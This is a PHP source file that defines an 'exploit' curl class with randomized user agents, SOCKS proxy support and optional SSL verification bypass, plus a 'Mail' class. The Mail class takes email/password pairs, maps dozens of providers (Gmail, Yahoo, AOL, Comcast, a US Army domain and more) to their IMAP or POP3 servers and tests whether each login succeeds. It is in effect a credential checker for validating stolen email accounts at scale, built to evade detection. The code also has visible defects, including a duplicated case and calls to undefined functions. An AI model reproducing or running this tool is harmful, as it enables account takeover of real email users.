<?php
/**
* How to this class work:
* $curl = new exploit();
* $curl->timeout(30,30); time out of exec is 30 seconds
* $curl->ssl(1,2); or $curl->ssl(false,false);
* $curl->cookies('cookies.txt'); cookies saved on cookies.txt file
* $curl->socks('127.0.0.1:443'); proxy sock is 127.0.0.1 with 443 port
* $curl->get('http://localhost'); get from url
* $curl->post('http://localhost/auth/login','username=Supian&password=exploded'); send post for login
* $curl->close(); close the exec
*/

class exploit {
	var $ch, $agent, $error, $info, $cookiefile;
	public function __construct(){
		$this->agent = $this->get_agent(rand(0,83));
		$this->ch = curl_init();
		curl_setopt($this->ch, CURLOPT_USERAGENT, $this->agent);
		//curl_setopt($this->ch, CURLOPT_HEADER, 1);
		curl_setopt($this->ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($this->ch, CURLOPT_FOLLOWLOCATION,true);
	}
	public function timeout($time) {
		curl_setopt($this->ch, CURLOPT_TIMEOUT, $time);
		curl_setopt($this->ch, CURLOPT_CONNECTTIMEOUT,$time);
	}
	public function ssl($veryfyPeer, $verifyHost){
        curl_setopt($this->ch, CURLOPT_SSL_VERIFYPEER, $veryfyPeer);
        curl_setopt($this->ch, CURLOPT_SSL_VERIFYHOST, $verifyHost);
    }
	public function header($header) {
		curl_setopt($this->ch, CURLOPT_HTTPHEADER, $header);
	}
	public function cookies() {
		$this->cookiefile = $_SERVER['DOCUMENT_ROOT'].'/tools/cookies/'.md5(DateTime().Random(5)).'.txt';
		$fp = fopen($this->cookiefile,'wb');
		fclose($fp);
		curl_setopt($this->ch, CURLOPT_COOKIEJAR, $this->cookiefile);
		curl_setopt($this->ch, CURLOPT_COOKIEFILE, $this->cookiefile);
	}
	public function ref($ref) {
		curl_setopt($this->ch, CURLOPT_REFERER, $ref);
	}	
	public function socks($sock) {
		//curl_setopt($this->ch, CURLOPT_HTTPPROXYTUNNEL, true); 
		curl_setopt($this->ch, CURLOPT_PROXY, $sock);
		curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); 
	}
	public function socks4($sock) {
		curl_setopt($this->ch, CURLOPT_HTTPPROXYTUNNEL, true); 
		curl_setopt($this->ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4); 
		curl_setopt($this->ch, CURLOPT_PROXY, $sock);

	}
	public function post($url, $data) {
		curl_setopt($this->ch, CURLOPT_POST, 1);	
		curl_setopt($this->ch, CURLOPT_POSTFIELDS, $data);
		return $this->getPage($url);
	}
	public function data($url, $data, $hasHeader=true, $hasBody=true) {
		curl_setopt($this->ch, CURLOPT_POST, 1);
		curl_setopt($this->ch, CURLOPT_POSTFIELDS, http_build_query($data));
		return $this->getPage($url, $hasHeader, $hasBody);
	}
	public function get($url, $hasHeader=true, $hasBody=true) {
		curl_setopt($this->ch, CURLOPT_POST, 0);
		return $this->getPage($url, $hasHeader, $hasBody);
	}	
	public function getPage($url, $hasHeader=true, $hasBody=true) {
		//curl_setopt($this->ch, CURLOPT_HEADER, $hasHeader ? 1 : 0);
		curl_setopt($this->ch, CURLOPT_NOBODY, $hasBody ? 0 : 1);
		curl_setopt($this->ch, CURLOPT_URL, $url);
		$data = curl_exec($this->ch);
		$this->error = curl_error($this->ch);
		$this->info  = curl_getinfo($this->ch);
		return $data;
	}	
	public function close() {
		unlink($this->cookiefile);
		curl_close ($this->ch);
	}
	public function get_agent($z){
		switch ($z){
			case 0  : $agent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1) Gecko/20061010 Firefox/2.0";break;
			case 1  : $agent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1";break;
			case 2  : $agent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)";break;
			case 3  : $agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)";break;
			case 4  : $agent = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)";break;
			case 5  : $agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)";break;
			case 6  : $agent = "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9a8) Gecko/2007100619 GranParadiso/3.0a8";break;
			case 7  : $agent = "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3";break;
			case 8  : $agent = "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4325)";break;
			case 9  : $agent = "Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 6.0)";break;
			case 10 : $agent = "Mozilla/4.0 (compatible; MSIE 5.5b1; Mac_PowerPC)";break;
			case 11 : $agent = "Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable";break;
			case 12 : $agent = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.4pre) Gecko/20070521 Camino/1.6a1pre";break;
			case 13 : $agent = "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9b5) Gecko/2008032620 Firefox/3.0b5 ";break;
			case 14 : $agent = "Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.8.0.2) Gecko/20060309 SeaMonkey/1.0";break;
			case 15 : $agent = "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1b2pre) Gecko/20081015 Fennec/1.0a1";break;
			case 16 : $agent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.6b) Gecko/20031212 Firebird/0.7+";break;
			case 17 : $agent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9b3) Gecko/2008020514 Firefox/3.0b3";break;
			case 18 : $agent = "Mozilla/5.0 (Windows; U; Windows NT 6.0; it; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9";break;
			case 19 : $agent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1.5) Gecko/20070713 Firefox/2.0.0.5";break;
			case 20 : $agent = "Mozilla/4.76 [en] (X11; U; Linux 2.4.9-34 i686)";break;
			case 21 : $agent = "Mozilla/4.75 [fr] (WinNT; U)";break;
			case 22 : $agent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.52 [en]";break;
			case 23 : $agent = "Mozilla/4.0 (compatible; MSIE 6.0; ; Linux i686) Opera 7.50 [en]";break;
			case 24 : $agent = "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.0.1) Gecko/20021216 Chimera/0.6";break;
			case 25 : $agent = "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)";break;
			case 26 : $agent = "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1; MS-RTC LM 8)";break;
			case 27 : $agent = "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; .NET CLR 3.0.04506.30)";break;
			case 28 : $agent = "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; InfoPath.1)";break;
			case 29 : $agent = "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)";break;
			case 30 : $agent = "Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)";break;
			case 31 : $agent = "Mozilla/5.0 (X11; U; Linux; it-IT) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.4 (Change: 413 12f13f8)";break;
			case 32 : $agent = "Mozilla/5.0 (X11; U; Linux; en-GB) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 239 52c6958)";break;
			case 33 : $agent = "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.2 (Change: 189 35c14e0)";break;
			case 34 : $agent = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; Avant Browser; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)";break;
			case 35 : $agent = "Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)";break;
			case 36 : $agent = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA";break;
			case 37 : $agent = "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/530.1 (KHTML, like Gecko) Chrome/2.0.164.0 Safari/530.1";break;
			case 38 : $agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; InfoPath.2; .NET CLR 2.0.50727; .NET CLR 1.1.4322; Crazy Browser 3.0.0 Beta2)";break;
			case 39 : $agent = "Mozilla/5.0 (X11; U; Linux i686; en; rv:1.8.1.12) Gecko/20080208 (Debian-1.8.1.12-2) Epiphany/2.20";break;
			case 40 : $agent = "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.04 (jaunty) Firefox/3.5";break;
			case 41 : $agent = "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081212 Mozilla/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/526.9 (KHTML, like Gecko) Version/4.0dp1 Safari/526.8";break;
			case 42 : $agent = "Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko/20050405 Epiphany/1.6.1 (Ubuntu) (Ubuntu package 1.0.2)";break;
			case 43 : $agent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.0.5) Gecko/20060731 Firefox/1.5.0.5 Flock/0.7.4.1";break;			
			case 44 : $agent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19 ";break;
			case 45 : $agent = "Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.5.22 Version/10.50";break;
            case 46 : $agent = "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.5.22 Version/10.50";break;
            case 47 : $agent = "Opera/9.80 (Windows NT 6.1; U; sk) Presto/2.6.22 Version/10.50";break;
            case 48 : $agent = "Opera/9.80 (Windows NT 6.1; U; ja) Presto/2.5.22 Version/10.50";break;
            case 49 : $agent = "Opera/9.80 (Windows NT 6.0; U; zh-cn) Presto/2.5.22 Version/10.50";break;
            "Opera/9.80 (Windows NT 5.1; U; sk) Presto/2.5.22 Version/10.50";break;
            case 50 : $agent = "Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.5.22 Version/10.50";break;
            case 51 : $agent = "Opera/10.50 (Windows NT 6.1; U; en-GB) Presto/2.2.2";break;
            case 52 : $agent = "Opera/9.80 (S60; SymbOS; Opera Tablet/9174; U; en) Presto/2.7.81 Version/10.5";break;
            case 53 : $agent = "Opera/9.80 (X11; U; Linux i686; en-US; rv:1.9.2.3) Presto/2.2.15 Version/10.10";break;
            case 54 : $agent = "Opera/9.80 (X11; Linux x86_64; U; it) Presto/2.2.15 Version/10.10";break;
            case 55 : $agent = "Opera/9.80 (Windows NT 6.1; U; de) Presto/2.2.15 Version/10.10";break;
            case 56 : $agent = "Opera/9.80 (Windows NT 6.0; U; Gecko/20100115; pl) Presto/2.2.15 Version/10.10";break;
            case 57 : $agent = "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.2.15 Version/10.10";break;
            case 58 : $agent = "Opera/9.80 (Windows NT 5.1; U; de) Presto/2.2.15 Version/10.10";break;
            case 69 : $agent = "Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.2.15 Version/10.10";break;
            case 60 : $agent = "Mozilla/5.0 (Windows NT 6.0; U; tr; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 10.10";break;
            case 61 : $agent = "Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; de) Opera 10.10";break;
            case 62 : $agent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 6.0; tr) Opera 10.10";break;
            case 63 : $agent = "Opera/9.80 (X11; Linux x86_64; U; en-GB) Presto/2.2.15 Version/10.01";break;
            case 64 : $agent = "Opera/9.80 (X11; Linux x86_64; U; en) Presto/2.2.15 Version/10.00";break;
            case 65 : $agent = "Opera/9.80 (X11; Linux x86_64; U; de) Presto/2.2.15 Version/10.00";break;
            case 66 : $agent = "Opera/9.80 (X11; Linux i686; U; ru) Presto/2.2.15 Version/10.00";break;
            case 67 : $agent = "Opera/9.80 (X11; Linux i686; U; pt-BR) Presto/2.2.15 Version/10.00";break;
            case 68 : $agent = "Opera/9.80 (X11; Linux i686; U; pl) Presto/2.2.15 Version/10.00";break;
            case 69 : $agent = "Opera/9.80 (X11; Linux i686; U; nb) Presto/2.2.15 Version/10.00";break;
            case 70 : $agent = "Opera/9.80 (X11; Linux i686; U; en-GB) Presto/2.2.15 Version/10.00";break;
            case 71 : $agent = "Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.00";break;
            case 72 : $agent = "Opera/9.80 (X11; Linux i686; U; Debian; pl) Presto/2.2.15 Version/10.00";break;
            case 73 : $agent = "Opera/9.80 (X11; Linux i686; U; de) Presto/2.2.15 Version/10.00";break;
            case 74 : $agent = "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.2.15 Version/10.00";break;
            case 75 : $agent = "Opera/9.80 (Windows NT 6.1; U; fi) Presto/2.2.15 Version/10.00";break;
            case 76 : $agent = "Opera/9.80 (Windows NT 6.1; U; en) Presto/2.2.15 Version/10.00";break;
            case 77 : $agent = "Opera/9.80 (Windows NT 6.1; U; de) Presto/2.2.15 Version/10.00";break;
            case 78 : $agent = "Opera/9.80 (Windows NT 6.1; U; cs) Presto/2.2.15 Version/10.00";break;
            case 79 : $agent = "Opera/9.80 (Windows NT 6.0; U; en) Presto/2.2.15 Version/10.00";break;
            case 80 : $agent = "Opera/9.80 (Windows NT 6.0; U; de) Presto/2.2.15 Version/10.00";break;
            case 81 : $agent = "Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.00";break;
            case 82 : $agent = "Opera/9.80 (Windows NT 5.1; U; zh-cn) Presto/2.2.15 Version/10.00";break;
            case 83 : $agent = "Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.2.15 Version/10.00";break;        
		}
		return $agent;
	}
}

//  Mail Class
class Mail{
	private $email, $pwd;
	
	public function __construct(){
		$this->email = "";
		$this->pwd = "";
	}
	
	public function check($email, $pwd){
		$this->email = $email;
		$this->pwd = $pwd;
		list($username, $domain) = explode('@', $this->email);
		$domain = strtolower($domain);
		if(strpos($domain,'yahoo.') !== false){
			return $this->check_yahoo();
		} else if(strpos($domain,'ymail.') !== false){
			return $this->check_yahoo();
		} else if(strpos($domain,'rocketmail.') !== false){
			return $this->check_yahoo();
		} else if(strpos($domain,'att.') !== false){
			return $this->check_yahoo();
		} else if(strpos($domain,'pya8.') !== false){
			return $this->check_gmail();
		} else if(strpos($domain,'bellsouth.') !== false){
			return $this->check_yahoo();
		} else if(strpos($domain,'ameritech.') !== false){
			return $this->check_yahoo();
		} else if(strpos($domain,'sbcglobal.') !== false){
			return $this->check_yahoo();
		} else if(strpos($domain,'btinternet.') !== false){
			return $this->check_yahoo();
		} else if(strpos($domain,'gmail.') !== false){
			return $this->check_gmail();
		} else if(strpos($domain,'googlemail.') !== false){
			return $this->check_gmail();
		} else if(strpos($domain,'aol.') !== false){
			return $this->check_aol();
		} else if(strpos($domain,'love.') !== false){
			return $this->check_aol();
		} else if(strpos($domain,'games.') !== false){
			return $this->check_aol();
		} else if(strpos($domain,'aim.') !== false){
			return $this->check_aim();	
		} else if(strpos($domain,'me.') !== false){
			return $this->check_me();
		} else if(strpos($domain,'mac.') !== false){
			return $this->check_me();
		} else if(strpos($domain,'live.') !== false){
			return $this->check_hotmail();
		} else if(strpos($domain,'hotmail.') !== false){
			return $this->check_hotmail();
		} else if(strpos($domain,'msn.') !== false){
			return $this->check_hotmail();
		} else if(strpos($domain,'compaq.') !== false){
			return $this->check_hotmail();
		} else if(strpos($domain,'messengeruser.') !== false){
			return $this->check_hotmail();
		} else if(strpos($domain,'passport.') !== false){
			return $this->check_hotmail();
		} else if(strpos($domain,'webtv.') !== false){
			return $this->check_hotmail();
		} else if(strpos($domain,'1and1.') !== false){
			return $this->check_1and1();
		} else if(strpos($domain,'airmail.') !== false){
			return $this->check_airmail();
		} else if(strpos($domain,'cableone') !== false){
			return $this->check_optonline();
		} else if(strpos($domain,'cablevision') !== false){
			return $this->check_gmail();
		} else if(strpos($domain,'centurylink.') !== false){
			return $this->check_centurylink();
		} else if(strpos($domain,'charter.') !== false){
			return $this->check_charter();
		} else if(strpos($domain,'clearwire.') !== false){
			return $this->check_gmail();
		} else if(strpos($domain,'comcast.') !== false){
			return $this->check_comcast();
		} else if(strpos($domain,'comnetcom') !== false){
			return $this->check_comnetcom();
		} else if(strpos($domain,'compuserve') !== false){
			return -1;	
		} else if(strpos($domain,'cs.com') !== false){
			return -1;	
		} else if(strpos($domain,'coqui.') !== false){
			return -1;	
		} else if(strpos($domain,'covad.') !== false){
			return -1;	
		} else if(strpos($domain,'cox.net') !== false){
			return $this->check_cox();
		} else if(strpos($domain,'coxmail') !== false){
			return $this->check_coxmail();
		} else if(strpos($domain,'earthlink') !== false){
			return $this->check_earthlink();
		} else if(strpos($domain,'embarq') !== false){
			return $this->check_centurylink();
		} else if(strpos($domain,'excite') !== false){
			return -1;	
		} else if(strpos($domain,'frontier') !== false){
			return -1;	
		} else if(strpos($domain,'grandecom') !== false){
			return -1;	
		} else if(strpos($domain,'netcom') !== false){
			return -1;	
		} else if(strpos($domain,'insightbb') !== false){
			return -1;	
		} else if(strpos($domain,'juno.') !== false){
			return $this->check_juno();	
		} else if(strpos($domain,'mail.com') !== false){
			return -1;	
		} else if(strpos($domain,'mediacom') !== false){
			return -1;	
		} else if(strpos($domain,'mindspring') !== false){
			return -1;	
		} else if(strpos($domain,'netaddress') !== false){
			return -1;	
		} else if(strpos($domain,'netzero') !== false){
			return $this->check_netzero();	
		} else if(strpos($domain,'netscape') !== false){
			return -1;	
		} else if(strpos($domain,'optonline') !== false){
			return $this->check_optonline();
		} else if(strpos($domain,'pipeline') !== false){
			return -1;	
		} else if(strpos($domain,'sky.') !== false){
			return $this->check_sky();	
		} else if(strpos($domain,'qwest') !== false){
			return $this->check_qwest();	
		} else if(strpos($domain,'rr.com') !== false){
			return -1;	
		} else if(strpos($domain,'surewest') !== false){
			return -1;	
		} else if(strpos($domain,'verizon.net') !== false){
			return $this->check_verizon();
		} else if(strpos($domain,'us.army.mil') !== false){
			return $this->check_usarmy();
		} else if(strpos($domain,'talktalk') !== false){
			return $this->check_talktalk();
		} else if(strpos($domain,'ntlworld') !== false){
			return $this->check_ntlworld();
		} else if(strpos($domain,'blueyonder') !== false){
			return $this->check_blueyonder();
		} else if(strpos($domain,'virgin.net') !== false){
			return $this->check_virgin();
		} else if(strpos($domain,'virginmedia') !== false){
			return $this->check_virginmedia();
		} else if(strpos($domain,'optimum') !== false){
			return $this->check_optimum();
		} else if(strpos($domain,'postmaster') !== false){
			return $this->check_postmaster();
		} else if(strpos($domain,'wavecable') !== false){
			return -1;
		} else if(strpos($domain,'windstream') !== false){
			return -1;
		}else{
			return -1;
		}
	}
	
	
	private function connect_imap($host, $port = 993, $ssl = '/ssl'){
		$hostname = '{' . $host . ':' . $port . '/imap' . $ssl . '}INBOX';
        
		imap_timeout(IMAP_OPENTIMEOUT, 5);
		$imap = @imap_open($hostname, $this->email, $this->pwd, OP_READONLY, 0);
        
		if(!$imap){
			$result = imap_last_error();
		}else{
			$result = 'OK';
		}
        
		@imap_close($imap);
        
        if($result=='OK'){
            return 1;
        }
        
		return $result;
	}
	
	private function connect_pop3($host, $port = 995, $ssl = '/ssl'){
		$hostname = '{' . $host . ':' . $port . '/pop3' . $ssl . '}INBOX';
        
		imap_timeout(IMAP_OPENTIMEOUT, 5);
		$imap = @imap_open($hostname, $this->email, $this->pwd, NULL, 0);
        
		if(!$imap){
			$result = imap_errors();
		}else{
			$result = 'OK';
		}
        
		@imap_close($imap);
        
        if(is_array($result)){
            return $result[0];
        }
        
		return 1;
	}
    
    private function check_netzero(){
        return $this->connect_pop3('pop.netzero.com');
    }
    
    private function check_postmaster(){
        return $this->connect_imap('imap.postmaster.co.uk');
    }
    
	private function check_ntlworld(){
	   return $this->connect_imap('imap.ntlworld.com');
	}
    
    private function check_blueyonder(){
	   return $this->connect_imap('imap4.blueyonder.co.uk');
	}
    
    private function check_virgin(){
	   return $this->connect_imap('imap4.virgin.net');
	}
    
    private function check_virginmedia(){
	   return $this->connect_imap('imap.virginmedia.com');
	}
        
    private function check_talktalk(){
        return $this->connect_imap('mail.talktalk.net', 143, '');
    }
    
	private function check_yahoo(){
		return $this->connect_imap('imap.mail.yahoo.com');
	}
	
	private function check_gmail(){
		return $this->connect_imap('imap.gmail.com');
	}
	
	private function check_aol(){
		return $this->connect_imap('imap.aol.com');
	}
	
	private function check_aim(){
		return $this->connect_imap('imap.aim.com', 143, '');
	}
	
	private function check_me(){
		return $this->connect_imap('imap.mail.me.com');
	}
	
	private function check_hotmail(){
		return $this->connect_pop3('pop3.live.com');
	}
	
	private function check_1and1(){
		return $this->connect_imap('imap.1and1.com');
	}
	
	private function check_airmail(){
		return $this->connect_imap('imap.airmail.net', 143, '');
	}
    
    private function check_optonline(){
		return $this->connect_pop3('mail.optonline.net', 110, '');
	}
	
    private function check_optimum(){
		return $this->connect_pop3('mail.optimum.net', 110, '');
	}
    
	private function check_juno(){
		return $this->connect_pop3('pop.juno.com');
	}
	
	private function check_verizon(){
		return $this->connect_pop3('pop.verizon.net');
	}
	
	private function check_sky(){
	 	return $this->connect_imap('imap.tools.sky.com');
	}
	
	private function check_usarmy(){
	 	return $this->connect_imap('imap.us.army.mil');
	}
	
	private function check_qwest(){
		return $this->connect_pop3('pop.mpls.qwest.net', 110, '');
	}
	
	private function check_earthlink(){
		return $this->connect_pop3('pop.earthlink.net', 110, '');
	}
	
	private function check_coxmail(){
		return $this->connect_imap('imap.coxmail.com');
	}
	
	private function check_cox(){
		return $this->connect_pop3('pop.cox.net', 110, '');
	}
	
	private function check_comnetcom(){
		return $this->connect_pop3('pop.comnetcom.net', 110, '');
	}
	
	private function check_comcast(){
		return $this->connect_pop3('mail.comcast.net', 110, '');
	}
	
	private function check_charter(){
		return $this->connect_imap('IMAP.charter.net', 143, '');
	}
	
	private function check_centurylink(){
		return $this->connect_pop3('pop.centurylink.net');
	}
}
